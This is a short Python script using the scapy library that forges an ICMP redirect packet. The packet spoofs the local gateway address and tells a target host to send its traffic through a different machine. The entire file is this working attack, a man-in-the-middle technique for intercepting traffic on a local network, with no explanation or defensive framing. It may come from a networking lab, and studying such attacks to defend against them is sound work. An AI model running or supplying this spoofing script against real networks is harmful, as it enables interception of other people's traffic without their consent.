import sys
from scapy.all import *

target = "192.168.0.13"
old_gateway = "192.168.0.1"
new_gateway = "192.168.0.12"

packet = IP(src=old_gateway, dst=target) / \
         ICMP(type=5, code=1, gw=new_gateway) / \
         IP(src=target, dst="0.0.0.0")
         
send(packet)
